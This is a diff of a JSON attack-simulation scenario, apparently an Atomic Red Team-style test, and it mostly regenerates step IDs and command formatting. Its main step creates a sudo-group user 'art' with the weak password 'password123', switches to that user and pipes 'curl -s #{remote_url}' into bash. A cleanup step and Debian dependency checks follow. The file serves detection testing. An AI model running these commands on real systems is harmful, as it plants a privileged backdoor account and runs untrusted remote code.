@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "0b4a36fe-8413-438a-99ec-e67997c260e7",
+      "id": "cdfbb94e-327f-47be-8cae-c0581d06e79f",
       "type": "execute-command",
       "data": {
-        "command": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
+        "command": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash",
         "command_type": "bash"
       },
       "elevation_required": true
     },
     {
-      "id": "347a091d-4608-4109-b0ce-376f14a688be",
+      "id": "090c61ec-ca38-4114-9600-161d20df6806",
       "type": "execute-command",
       "data": {
-        "command": "userdel -fr art\n",
+        "command": "userdel -fr art",
         "command_type": "bash"
       },
       "elevation_required": true
     },
     {
-      "id": "61370281-6115-46cf-ab4f-4a48d4038f72",
+      "id": "97a5f4bd-f046-459a-aa08-bbdbd114d6b9",
       "name": "Check dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
       "data": {
-        "command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif grep -Rq \"pam_tally\" /etc/pam.d/*; then echo \"pam_tally configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
-        "command_type": ""
+        "command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif grep -Rq \"pam_tally\" /etc/pam.d/*; then echo \"pam_tally configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi",
+        "command_type": "bash"
       },
       "elevation_required": true
     },
     {
-      "id": "60b2a6cb-cff8-4407-b265-53cd622ce1b5",
+      "id": "d15a21f7-6f03-42df-8c0e-1a552fd9076a",
       "name": "Resolve dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
       "data": {
-        "command": "apt update \u0026\u0026 apt install -y openssl sudo curl\n",
-        "command_type": ""
+        "command": "apt update \u0026\u0026 apt install -y openssl sudo curl",
+        "command_type": "bash"
       },
       "elevation_required": true
     },
     {
-      "id": "eb50f781-1a47-428a-9a9e-0e9ffe4c4321",
+      "id": "9038192f-2e37-41d5-b0b7-3a30f28f1c51",
       "name": "Re-check dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
       "data": {
-        "command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif grep -Rq \"pam_tally\" /etc/pam.d/*; then echo \"pam_tally configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
-        "command_type": ""
+        "command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif grep -Rq \"pam_tally\" /etc/pam.d/*; then echo \"pam_tally configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi",
+        "command_type": "bash"
       },
       "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "0b4a36fe-8413-438a-99ec-e67997c260e7",
+      "s": "cdfbb94e-327f-47be-8cae-c0581d06e79f",
       "p": "on-success",
-      "o": "347a091d-4608-4109-b0ce-376f14a688be"
+      "o": "090c61ec-ca38-4114-9600-161d20df6806"
     },
     {
-      "s": "0b4a36fe-8413-438a-99ec-e67997c260e7",
+      "s": "cdfbb94e-327f-47be-8cae-c0581d06e79f",
       "p": "on-failure",
-      "o": "347a091d-4608-4109-b0ce-376f14a688be"
+      "o": "090c61ec-ca38-4114-9600-161d20df6806"
     },
     {
-      "s": "61370281-6115-46cf-ab4f-4a48d4038f72",
+      "s": "97a5f4bd-f046-459a-aa08-bbdbd114d6b9",
       "p": "on-success",
-      "o": "0b4a36fe-8413-438a-99ec-e67997c260e7"
+      "o": "cdfbb94e-327f-47be-8cae-c0581d06e79f"
     },
     {
-      "s": "61370281-6115-46cf-ab4f-4a48d4038f72",
+      "s": "97a5f4bd-f046-459a-aa08-bbdbd114d6b9",
       "p": "on-failure",
-      "o": "60b2a6cb-cff8-4407-b265-53cd622ce1b5"
+      "o": "d15a21f7-6f03-42df-8c0e-1a552fd9076a"
     },
     {
-      "s": "60b2a6cb-cff8-4407-b265-53cd622ce1b5",
+      "s": "d15a21f7-6f03-42df-8c0e-1a552fd9076a",
       "p": "on-success",
-      "o": "eb50f781-1a47-428a-9a9e-0e9ffe4c4321"
+      "o": "9038192f-2e37-41d5-b0b7-3a30f28f1c51"
     },
     {
-      "s": "eb50f781-1a47-428a-9a9e-0e9ffe4c4321",
+      "s": "9038192f-2e37-41d5-b0b7-3a30f28f1c51",
       "p": "on-failure",
-      "o": "0b4a36fe-8413-438a-99ec-e67997c260e7"
+      "o": "cdfbb94e-327f-47be-8cae-c0581d06e79f"
     }
   ],
   "tags": [
